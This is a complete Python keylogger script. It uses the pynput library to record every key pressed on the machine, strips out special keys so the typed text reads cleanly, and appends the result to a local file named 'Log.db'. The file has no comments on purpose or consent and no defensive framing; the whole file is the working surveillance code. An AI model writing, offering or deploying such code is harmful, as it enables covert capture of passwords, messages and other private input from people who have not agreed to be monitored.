from pynput.keyboard import Listener

def log_pressedkey(key):
    key = str(key).replace("'", "")  # Convert key to string and clean it up

    if key == "Key.space":
        key = " "
    elif key == "Key.enter":
        key = "\n"
    elif key in ("Key.shift", "Key.shift_r", "Key.shift_l"):
        key = ""
    elif key.startswith("Key."):
        key = ""  # ignore other special keys

    with open("Log.db", "a") as f:
        f.write(key)

# Start the listener
with Listener(on_press=log_pressedkey) as listener:
    listener.join()